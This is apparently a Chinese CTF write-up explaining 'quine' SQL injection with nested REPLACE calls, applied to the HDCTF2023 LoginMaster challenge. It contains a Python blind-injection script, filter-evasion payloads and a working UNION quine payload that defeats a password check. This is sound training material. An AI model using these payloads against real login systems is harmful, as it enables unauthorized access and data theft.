## Quine注入

### 原理

[从三道赛题再谈Quine trick](https://www.anquanke.com/post/id/253570#h2-9)

[CTFHub_2021-第五空间智能安全大赛-Web-yet_another_mysql_injection（quine注入）](https://www.cnblogs.com/zhengna/p/15917521.html)

[yet_another_mysql_injection-Qunie](https://www.cnblogs.com/aninock/p/16467716.html)



### 实验

看着有点烧脑，其实就是套娃

我们首先尝试一下：

```sql
select REPLACE('.',char(46),'.');
```

![image-20230423153453045](https://s2.loli.net/2023/04/23/rtYn4WiP9T2D7Io.png)

输出是一个小数点 .



我们尝试将 上一段代码中的小数点 **.** 替换为：

```sql
REPLACE(".",char(46),".")   -- 这里使用双引号包裹，防止单双引号重叠
```

完整代码：

```sql
select REPLACE('REPLACE(".",char(46),".")',char(46),'REPLACE(".",char(46),".")');
```

![image-20230423153432347](https://s2.loli.net/2023/04/23/Qsg7HvIrREJfYFN.png)

乍一看好像是一样的，但是单双引号有点区别，我们需要再套`REPLACE`替换一下

```sql
select replace(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),char(46),'replace(replace(".",char(34),char(39)),char(46),".")');
```

![image-20230423155242323](https://s2.loli.net/2023/04/23/yma7of36rFAWenx.png)

是真的麻烦。。



基本上就是这种思路了





### 例题

#### [HDCTF2023]LoginMaster



**robots.txt泄露**

```php
<?php
function checkSql($s) 
{
    if(preg_match("/regexp|between|in|flag|=|>|<|and|\||right|left|reverse|update|extractvalue|floor|substr|&|;|\\\$|0x|sleep|\ /i",$s)){
        alertMes('hacker', 'index.php');
    }
}
if ($row['password'] === $password) {
        die($FLAG);
    } else {
    alertMes("wrong password",'index.php');
```

sql注入题目，username必须为admin，此处我们需要从密码着手

但是注意看，过滤了 `in` ，意味着我们不能使用 `information_schema`库查询表名，列名

我本来是想找一下除了`information_schema`库，还有哪些库能用来查询的，找了这么几个：

```sql
mysql.innodb_table_stats
sys.schema_table_statistics
sys.schema_table_statistics_with_buffer
```

这几个都能用来查询表名，此处我们可以使用下面两个，我们我们写脚本去查询表名：

```python
import requests

url = "http://node5.anna.nssctf.cn:28973"
flag = ""
s = "0123456789abcdefghijklmnopqrstuvwxyz-{}_.,"

for i in range(60):
    for j in s:
        # payload = "1'/**/or/**/if((mid((select/**/version()),{},1)/**/like/**/'{}'),1,0)#".format(i, j) # 10_2_32-mariadb
        # payload = "1'/**/or/**/if((mid((select/**/database()),{},1)/**/like/**/'{}'),1,0)#".format(i, j) # ciscn
        # payload = "1'/**/or/**/if((mid((select/**/group_concat(table_name)/**/from/**/sys.schema_table_statistics),{},1)/**/like/**/'{}'),1,0)#".format(i, j)
        payload = "1'/**/or/**/if((mid((select/**/group_concat(table_name)/**/from/**/sys.schema_table_statistics/**/where/**/table_schema/**/like/**/'ciscn'),{},1)/**/like/**/'{}'),1,0)#".format(i, j)
        data = {
            'username': 'admin',
            'password': payload
        }
        req = requests.post(url=url, data=data)
        # print(payload)
        # print(req.text)
        if 'hacker' in req.text:
            print(payload)
        if 'something' in req.text:
            print("someting")
        if 'wrong password' in req.text:
            flag += j
            print(flag)
            break
```

发现啥都查不出来。。



实际上此处为一张空表，我们需要使用另一种做法(**quine**)

重点的代码是这里：

```php
if ($row['password'] === $password) {
        die($FLAG);
    } 
```

我们除了让输入的密码与真正的密码一致外，还可以让**输入的结果与输出的结果相同**，同样可以实现获得flag



举个例子：

```sql
select replace(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),char(46),'replace(replace(".",char(34),char(39)),char(46),".")');
```

![image-20230423152442610](https://s2.loli.net/2023/04/23/GhX91m7y3JwE85Y.png)

输入和输出结果一致，从而可以绕过





payload：

```sql
1'UNION(SELECT(REPLACE(REPLACE('1"UNION(SELECT(REPLACE(REPLACE("%",CHAR(34),CHAR(39)),CHAR(37),"%")))#',CHAR(34),CHAR(39)),CHAR(37),'1"UNION(SELECT(REPLACE(REPLACE("%",CHAR(34),CHAR(39)),CHAR(37),"%")))#')))#
```

![image-20230423155425281](https://s2.loli.net/2023/05/27/kqJm6GTvw1L2sCU.png)

















